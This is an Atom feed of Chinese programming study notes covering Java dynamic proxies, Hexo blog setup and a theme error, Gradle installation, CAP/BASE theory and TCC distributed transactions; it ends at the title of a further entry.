<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>horseber</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-09-19T00:57:39.074Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>horseber</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>动态代理与反射</title>
    <link href="http://example.com/2020/09/19/Study%20notes/3%E3%80%81java/10%E3%80%81%E5%8F%8D%E5%B0%84/2%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
    <id>http://example.com/2020/09/19/Study%20notes/3%E3%80%81java/10%E3%80%81%E5%8F%8D%E5%B0%84/2%E3%80%81%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%B0%84/</id>
    <published>2020-09-19T00:36:06.000Z</published>
    <updated>2020-09-19T00:57:39.074Z</updated>
    
    <content type="html"><![CDATA[<p>利用Java反射机制你可以在运行期动态的创建接口的实现。java.lang.reflect.Proxy类就可以实现这一功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler handler &#x3D; new MyInvocationHandler();</span><br><span class="line">MyInterface proxy &#x3D; (MyInterface) Proxy.newProxyInstance(</span><br><span class="line">                            MyInterface.class.getClassLoader(),</span><br><span class="line">                            new Class[] &#123; MyInterface.class &#125;,</span><br><span class="line">                            handler);</span><br></pre></td></tr></table></figure><ul><li>1、类加载器（ClassLoader）用来加载动态代理类。</li><li>2、一个要实现的接口的数组。</li><li>3、一个InvocationHandler把所有方法的调用都转到代理上。</li></ul><p>所有对proxy的调用都委托到实现了InvocationHandler接口的handler上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class MyInvocationHandler implements InvocationHandler&#123;</span><br><span class="line"></span><br><span class="line">  public Object invoke(Object proxy, Method method, Object[] args)</span><br><span class="line">  throws Throwable &#123;</span><br><span class="line">    &#x2F;&#x2F;do something &quot;dynamic&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>proxy参数是实现要代理接口的动态代理对象。通常你是不需要他的。</li><li>Method对象参数代表了被动态代理的接口中要调用的方法，从这个method对象中你可以获取到这个方法名字，方法的参数，参数类型等等信息</li></ul><p>动态代理常被应用到以下几种情况中</p><ul><li>数据库连接以及事物管理</li><li>单元测试中的动态Mock对象</li><li>自定义工厂与依赖注入（DI）容器之间的适配器</li><li>类似AOP的方法拦截器</li></ul>]]></content>
    
    
    <summary type="html">利用Java反射机制你可以在运行期动态的创建接口的实现。java.lang.reflect.Proxy类就可以实现这一功能</summary>
    
    
    
    <category term="反射" scheme="http://example.com/categories/%E5%8F%8D%E5%B0%84/"/>
    
    
    <category term="动态代理与反射" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>Hexo常见错误</title>
    <link href="http://example.com/2020/09/18/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/hexo/Hexo%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"/>
    <id>http://example.com/2020/09/18/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/hexo/Hexo%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/</id>
    <published>2020-09-18T12:50:05.000Z</published>
    <updated>2020-09-19T00:57:43.249Z</updated>
    
    <content type="html"><![CDATA[<p>更换next主题时候，启动的时候报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">WARN  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">WARN  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; ATTENTION! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">WARN  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">WARN   NexT repository is moving here: https:&#x2F;&#x2F;github.com&#x2F;theme-next</span><br><span class="line">WARN  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">WARN   It&#39;s rebase to v6.0.0 and future maintenance will resume there</span><br><span class="line">WARN  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">INFO  Hexo is running at http:&#x2F;&#x2F;localhost:4000 . Press Ctrl+C to stop.</span><br><span class="line">INFO  See you again</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问首页出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#39;_layout.swig&#39; %&#125; &#123;% import &#39;_macro&#x2F;post.swig&#39; as post_template %&#125; &#123;% import &#39;_macro&#x2F;sidebar.swig&#39; as sidebar_template %&#125; &#123;% block title %&#125;&#123;&#123; config.title &#125;&#125;&#123;% if theme.index_with_subtitle and config.subtitle %&#125; - &#123;&#123;config.subtitle &#125;&#125;&#123;% endif %&#125;&#123;% endblock %&#125; &#123;% block page_class %&#125; &#123;% if is_home() %&#125;page-home&#123;% endif -%&#125; &#123;% endblock %&#125; &#123;% block content %&#125;</span><br><span class="line">&#123;% for post in page.posts %&#125; &#123;&#123; post_template.render(post, true) &#125;&#125; &#123;% endfor %&#125;</span><br><span class="line">&#123;% include &#39;_partials&#x2F;pagination.swig&#39; %&#125; &#123;% endblock %&#125; &#123;% block sidebar %&#125; &#123;&#123; sidebar_template.render(false) &#125;&#125; &#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>next官网的指南和相当多的博客上的下载网址都是旧的，会出现以上错误。根据提示说明使用命令行下载的时候，next主题下载网址不对，应该改成命令提示中的网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next.git</span><br></pre></td></tr></table></figure><p>其他常见错误：<a href="http://theme-next.iissnan.com/faqs.html">http://theme-next.iissnan.com/faqs.html</a></p>]]></content>
    
    
    <summary type="html">更换next主题时候，启动的时候报错：</summary>
    
    
    
    <category term="hexo" scheme="http://example.com/categories/hexo/"/>
    
    
    <category term="Hexo常见错误" scheme="http://example.com/tags/Hexo%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+Github</title>
    <link href="http://example.com/2020/09/18/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/hexo/Hexo+Github/"/>
    <id>http://example.com/2020/09/18/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/hexo/Hexo+Github/</id>
    <published>2020-09-18T12:47:19.000Z</published>
    <updated>2020-09-19T00:57:43.235Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>安装 Hexo 相当简单,但若Node安装有问题，环境变量配置等出问题，后面安装hexo很恶心。</p><p>Node.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nodejs.org&#x2F;dist&#x2F;v10.13.0&#x2F;node-v10.13.0-x64.msi(Winx64)</span><br></pre></td></tr></table></figure><p>Git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;git-for-windows&#x2F;git&#x2F;releases&#x2F;download&#x2F;v2.19.1.windows.1&#x2F;Git-2.19.1-64-bit.exe（Win x64）</span><br></pre></td></tr></table></figure><p>检查Node.js 和 Git </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">git --version</span><br></pre></td></tr></table></figure><p>主要nodejs和npm版本需要对应上,</p><p>参考nodejs和npm版本对应关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;nodejs.org&#x2F;zh-cn&#x2F;download&#x2F;releases&#x2F;</span><br></pre></td></tr></table></figure><p>安装hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>查看版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><p>安装Hexo 插件：自动生成sitemap,Rss，部署到git等，建议安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br><span class="line">npm install --save hexo-deployer-git</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hexo常用的几个命令</p><p>新建博客目录，进入，初始化工作空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>1、创建新博文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &quot;postName&quot; #新建文章</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#清除缓存</span><br><span class="line">hexo clean</span><br><span class="line"></span><br><span class="line">#生成静态站点文件</span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">#运行服务器</span><br><span class="line">hexo s</span><br><span class="line"></span><br><span class="line">#发布到github</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>部署到Github前需要配置_config.yml文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repository: git@github.com:EZLippi&#x2F;EZLippi.github.io.git</span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure><p>next主题配置主页说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;theme-next.iissnan.com&#x2F;theme-settings.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</summary>
    
    
    
    <category term="hexo" scheme="http://example.com/categories/hexo/"/>
    
    
    <category term="Hexo+Github" scheme="http://example.com/tags/Hexo-Github/"/>
    
  </entry>
  
  <entry>
    <title>无标题Markdown</title>
    <link href="http://example.com/2020/09/17/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/3%E3%80%81%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/Gradle/%E6%97%A0%E6%A0%87%E9%A2%98Markdown/"/>
    <id>http://example.com/2020/09/17/Study%20notes/8%E3%80%81%E5%B7%A5%E5%85%B7%E7%AF%87/3%E3%80%81%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/Gradle/%E6%97%A0%E6%A0%87%E9%A2%98Markdown/</id>
    <published>2020-09-17T13:05:55.000Z</published>
    <updated>2020-09-19T00:57:42.872Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://gradle.org/releases/">https://gradle.org/releases/</a> 这个是发布版，当然你还可以去 <a href="https://services.gradle.org/">https://services.gradle.org/</a> 下载更新的版本。本人下载5.2.1的发布版 <a href="https://gradle.org/next-steps/?version=5.2.1&amp;format=all">https://gradle.org/next-steps/?version=5.2.1&amp;format=all</a> </p><p>二、配置环境变量：GRADLE_HOME 变量值为Gradle文件解压的实际路径，本文为例：E:\Gradle\gradle-5.2.1-all\gradle-5.2.1</p><p>　　在系统变量 path中加入：%GRADLE_HOME%\bin;<br>　　<br>　　<br>　　在cmd输入gradle -v验证是否安装成功</p>]]></content>
    
    
    <summary type="html">https://gradle.org/releases/ 这个是发布版，当然你还可以去 https://services.gradle.org/ 下载更新的版本。本人下载5.2.1的发布版 https://gradle.org/nextsteps/?version5.2.1&amp;formatall</summary>
    
    
    
    <category term="Gradle" scheme="http://example.com/categories/Gradle/"/>
    
    
    <category term="无标题Markdown" scheme="http://example.com/tags/%E6%97%A0%E6%A0%87%E9%A2%98Markdown/"/>
    
  </entry>
  
  <entry>
    <title>CAP、BASE理论</title>
    <link href="http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2%E3%80%81CAP%E3%80%81BASE%E7%90%86%E8%AE%BA/"/>
    <id>http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/2%E3%80%81CAP%E3%80%81BASE%E7%90%86%E8%AE%BA/</id>
    <published>2020-09-15T22:58:06.000Z</published>
    <updated>2020-09-19T00:57:40.283Z</updated>
    
    <content type="html"><![CDATA[<ul><li>1、商品服务请求主数据库写入商品信息（添加商品、修改商品、删除商品）</li><li>2、主数据库向商品服务响应写入成功。</li><li>3、商品服务请求从数据库读取商品信息。</li></ul><h4 id="C-Consistency："><a href="#C-Consistency：" class="headerlink" title="C  Consistency："></a>C  Consistency：</h4><p>一致性是指写操作后的读操作可以读取到最新的数据状态，当数据分布在多个节点上，从任意结点读取到的数据都 是最新的状态。<br>上图中，商品信息的读写要满足一致性就是要实现如下目标：</p><ul><li>1、商品服务写入主数据库成功，则向从数据库查询新数据也成功。</li><li>2、商品服务写入主数据库失败，则向从数据库查询新数据也失败。 如何实现一致性？</li><li>3、写入主数据库后要将数据同步到从数据库。</li><li>4、写入主数据库后，在向从数据库同步期间要将从数据库锁定，待同步完成后再释放锁，以免在新数据写入成功 后，向从数据库查询到旧的数据。</li></ul><p>分布式系统一致性的特点：</p><ul><li>1、由于存在数据同步的过程，写操作的响应会有一定的延迟。 </li><li>2、为了保证数据一致性会对资源暂时锁定，待数据同步完成释放锁定资源。 </li><li>3、如果请求数据同步失败的结点则会返回错误信息，一定不会返回旧数据。 </li></ul><h4 id="A-Availability-："><a href="#A-Availability-：" class="headerlink" title="A - Availability ："></a>A - Availability ：</h4><p>可用性是指任何事务操作都可以得到响应结果，且不会出现响应超时或响应错误。 上图中，商品信息读取满足可用性就是要实现如下目标： </p><ul><li>1、从数据库接收到数据查询的请求则立即能够响应数据查询结果。 </li><li>2、从数据库不允许出现响应超时或响应错误。 如何实现可用性？ </li><li>1、写入主数据库后要将数据同步到从数据库。 </li><li>2、由于要保证从数据库的可用性，不可将从数据库中的资源进行锁定。 </li><li>3、即时数据还没有同步过来，从数据库也要返回要查询的数据，哪怕是旧数据，如果连旧数据也没有则可以按照 约定返回一个默认信息，但不能返回错误或响应超时。 分布式系统可用性的特点： 1、 所有请求都有响应，且不会出现响应超时或响应错误。</li></ul><h5 id="P-Partition-tolerance-："><a href="#P-Partition-tolerance-：" class="headerlink" title="P - Partition tolerance ："></a>P - Partition tolerance ：</h5><p>通常分布式系统的各各结点部署在不同的子网，这就是网络分区，不可避免的会出现由于网络问题而导致结点之间 通信失败，此时仍可对外提供服务，这叫分区容忍性。 上图中，商品信息读写满足分区容忍性就是要实现如下目标： </p><ul><li>1、主数据库向从数据库同步数据失败不影响读写操作。 </li><li>2、其一个结点挂掉不影响另一个结点对外提供服务。 如何实现分区容忍性？ </li><li>1、尽量使用异步取代同步操作，例如使用异步方式将数据从主数据库同步到从数据，这样结点之间能有效的实现 松耦合。 </li><li>2、添加从数据库结点，其中一个从结点挂掉其它从结点提供服务。 分布式分区容忍性的特点： 1、分区容忍性分是布式系统具备的基本能力。</li></ul><p>一般都会做出如下选择：保证P和A，舍弃C强一致，保证最终一致性。</p><p>BASE理论</p><p>1、理解强一致性和最终一致性 CAP理论告诉我们一个分布式系统最多只能同时满足一致性（Consistency）、可用性（Availability）和分区容忍 性（Partition tolerance）这三项中的两项，其中AP在实际应用中较多，AP即舍弃一致性，保证可用性和分区容忍 性，但是在实际生产中很多场景都要实现一致性，比如前边我们举的例子主数据库向从数据库同步数据，即使不要 一致性，但是最终也要将数据同步成功来保证数据一致，这种一致性和CAP中的一致性不同，CAP中的一致性要求 在任何时间查询每个结点数据都必须一致，它强调的是强一致性，但是最终一致性是允许可以在一段时间内每个结 点的数据不一致，但是经过一段时间每个结点的数据必须一致，它强调的是最终数据的一致性。 </p><p>2、Base理论介绍 BASE 是 Basically Available(基本可用)、Soft state(软状态)和 Eventually consistent (最终一致性)三个短语的缩 写。</p><p>==BASE理论是对CAP中AP的一个扩展，通过牺牲强一致性来获得可用性==，当出现故障允许部分不可用但要保证 核心功能可用，允许数据在一段时间内是不一致的，但最终达到一致状态。满足BASE理论的事务，我们称之为“柔 性事务”。</p><ul><li>基本可用:分布式系统在出现故障时，允许损失部分可用功能，保证核心功能可用。如，电商网站交易付款出 现问题了，商品依然可以正常浏览。 </li><li>软状态:由于不要求强一致性，所以BASE允许系统中存在中间状态（也叫软状态），这个状态不影响系统可用 性，如订单的”支付中”、“数据同步中”等状态，待数据最终一致后状态改为“成功”状态。 </li><li>最终一致:最终一致是指经过一段时间后，所有节点数据都将会达到一致。如订单的”支付中”状态，最终会变 为“支付成功”或者”支付失败”，使订单状态与实际交易结果达成一致，但需要一定时间的延迟、等待。</li></ul>]]></content>
    
    
    <summary type="html">1、商品服务请求主数据库写入商品信息（添加商品、修改商品、删除商品） 2、主数据库向商品服务响应写入成功。</summary>
    
    
    
    <category term="分布式事务解决方案" scheme="http://example.com/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
    
    <category term="CAP、BASE理论" scheme="http://example.com/tags/CAP%E3%80%81BASE%E7%90%86%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>分布式事务-TCC补偿机制</title>
    <link href="http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-TCC%E8%A1%A5%E5%81%BF%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2020/09/16/Study%20notes/4%E3%80%81%E6%A1%86%E6%9E%B6/11%E3%80%81%E9%AB%98%E9%A2%91%E7%82%B9%E9%97%AE%E9%A2%98/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/5%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-TCC%E8%A1%A5%E5%81%BF%E6%9C%BA%E5%88%B6/</id>
    <published>2020-09-15T22:58:06.000Z</published>
    <updated>2020-09-19T00:57:40.301Z</updated>
    
    <content type="html"><![CDATA[<p>TCC事务是Try、Commit、Cancel三种指令的缩写，其逻辑模式类似于数据库层的XA两阶段提交，==但是实现方式是在代码层面来人为实现==。</p><p>TCC开源框架ByteTCC，tcc-transaction，himly,EasyTransaction</p><p>1、先来Try一下，不要把业务逻辑完成，先试试看，看各个服务能不能基本正常运转，能不能先冻结我需要的资源。如果Try都ok，也就是说，底层的数据库、redis、elasticsearch、MQ都是可以写入数据的，并且你保留好了需要使用的一些资源（比如冻结了一部分库存）。</p><p>2、再执行各个服务的Confirm逻辑，基本上Confirm就可以很大概率保证一个分布式事务的完成了。</p><p>3、如果try或Confirm 失败了则执行cancel回滚逻辑（如果cancel回滚阶段异常，可多次调用等补偿机制），所有服务都不要执行任何设计的业务逻辑。保证大家要么一起成功，要么一起失败。</p><h4 id="示例：下单减库存的方案-伪代码"><a href="#示例：下单减库存的方案-伪代码" class="headerlink" title="示例：下单减库存的方案[伪代码]"></a>示例：下单减库存的方案[伪代码]</h4><p>单机服务各个系统都在同一台服务器上，可以直接执行以下伪代码，本地事务保证数据一致性，任何一步异常则回滚整个事务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">订单系统：下单</span><br><span class="line">支付系统：支付[成功]</span><br><span class="line">优惠券系统：扣减优惠券</span><br><span class="line">库存系统：减库存</span><br><span class="line">用户系统：增加用户积分</span><br></pre></td></tr></table></figure><p>分布式系统中，各个服务都在不同机器上，无法利用本地事务。则可以使用TCC补偿机制</p><p>try阶段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">订单系统：下单</span><br><span class="line">优惠券系统：先冻结优惠券</span><br><span class="line">库存系统：先预占库存</span><br><span class="line">用户系统：先预增加用户积分</span><br></pre></td></tr></table></figure><p>Confirm阶段：主要是对业务系统做确认提交，Try阶段执行成功并开始执行 Confirm阶段时，默认Confirm阶段是不会出错的。即：只要Try成功，Confirm一定成功。(Confirm 操作满足幂等性。要求具备幂等设计，Confirm 失败后需要进行重试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">支付系统：支付[成功]</span><br><span class="line">优惠券系统：解冻优惠券-真正扣减优惠券</span><br><span class="line">库存系统：释放预占库存-真正减库存</span><br><span class="line">用户系统：回滚预增加的用户积分-真正增加用户积分</span><br></pre></td></tr></table></figure><p>cancel阶段：业务执行错误，需要回滚的状态下执行的业务取消，预留资源释放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">支付系统：支付[失败]</span><br><span class="line">优惠券系统：解冻优惠券</span><br><span class="line">库存系统：释放预占库存</span><br><span class="line">用户系统：回滚预增加的用户积分</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/eluanshi12/article/details/84528393">https://blog.csdn.net/eluanshi12/article/details/84528393</a></p><p>TCC可以让应用自己定义数据操作的粒度，使 得降低锁冲突、提高吞吐量成为可能<br>不足之处则在于对应用的侵入性非常强，业务逻辑的每个分支都需要实现try、confirm、cancel三个操作。此 外，其实现难度也比较大，需要按照网络状态、系统故障等不同的失败原因实现不同的回滚策略。</p>]]></content>
    
    
    <summary type="html">TCC事务是Try、Commit、Cancel三种指令的缩写，其逻辑模式类似于数据库层的XA两阶段提交，但是实现方式是在代码层面来人为实现。</summary>
    
    
    
    <category term="分布式事务解决方案" scheme="http://example.com/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    
    
    <category term="分布式事务-TCC补偿机制" scheme="http://example.com/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1-TCC%E8%A1%A5%E5%81%BF%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>分布式事务-异步消息确保</title>
